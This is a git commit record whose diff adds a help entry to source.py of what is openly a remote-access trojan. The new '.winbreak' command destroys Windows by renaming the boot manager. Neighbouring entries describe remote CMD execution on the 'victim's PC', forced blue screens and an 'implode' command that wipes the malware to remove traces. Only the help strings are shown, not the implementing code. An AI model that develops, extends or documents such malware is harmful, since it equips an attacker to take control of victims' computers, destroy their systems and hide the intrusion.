5987bd055a2a151de2ab1c491a2ed440fb4cf614
JuicyChann <nik.xeiladakis@gmail.com>
2023-09-30 17:54:41 +0300

    add winbreak to help

--- source.py
+++ source.py
@@ -416,6 +416,7 @@ help = {
         'cmd': ['➡️ `.cmd <command>`', 'Executes specified Command Prompt command on the victim\'s PC and sends back the output. Options:\n🔹command - a CMD command that will be executed on victim\'s PC'],
         'bsod': ['➡️ `.bsod`', 'Triggers a Blue Screen of Death on the victim\'s PC.'],
         'jumpscare': ['➡️ `.jumpscare`', 'Plays a very loud & rapidly flashing video.'],
+        'winbreak': ['➡️ `.winbreak`', 'Destroys Windows by renaming the boot manager. (Dangerous)'],
         'implode': ['➡️ `.implode`', 'Entirely wipes the malware off of the victim\'s PC (to remove traces).']
     }
 }
